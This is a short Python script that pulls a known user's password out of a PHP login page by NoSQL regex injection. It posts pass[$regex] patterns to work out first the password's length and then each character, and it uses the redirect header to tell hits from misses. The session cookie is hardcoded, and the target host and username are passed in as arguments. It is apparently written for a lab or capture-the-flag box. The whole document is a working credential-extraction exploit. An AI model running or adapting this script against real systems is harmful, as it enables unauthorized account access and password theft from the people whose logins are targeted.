import requests
import argparse

parser = argparse.ArgumentParser(description='Brute force password for nosql databases.')
parser.add_argument('--host', type=str, help='Target Ip')
parser.add_argument('--username', type=str, help='Enumerated host name')
arg = parser.parse_args()

url = f'http://{arg.host}/login.php'
words = 'abcdefghijklmnopqrstuvwxyz1234567890'
uName = arg.username

# Guessing Password Length
i=1
while True:
    myData = 'user='+uName+'&pass[$regex]=^.{'+str(i)+'}$&remember=on'
    sReq = requests.post(url, data=myData, allow_redirects=False, headers={'Cookie': 
'PHPSESSID=vjqv6iqd8e5ld46r0au086dcei', 'Content-Type': 'application/x-www-form-urlencoded'})
    answers = sReq.headers
    if answers['Location'] != '/?err=1':
        pLength = i
        break
    else:
        i+=1

print(f'Password length: {pLength}')

numb = 20 + len(uName)
password = ''

dots=''
for i in range(pLength):
    dots += '.'
myData = 'user='+uName+'&pass[$regex]=^'+dots+'$&remember=on'
print(myData)

while pLength:
    for i in words:
        myData = myData[:numb]+i+myData[numb+1:]
        x = requests.post(url, data=myData, allow_redirects=False, headers={'Cookie': 
'PHPSESSID=vjqv6iqd8e5ld46r0au086dcei', 'Content-Type': 'application/x-www-form-urlencoded'})
        answers = x.headers
        if answers['Location'] != '/?err=1':
            password += i
            pLength-=1
            numb+=1
            print(myData)
            break
print(f'Password = {password}\nData: {myData[:10+len(uName)]}={password}{myData[-12:]}')

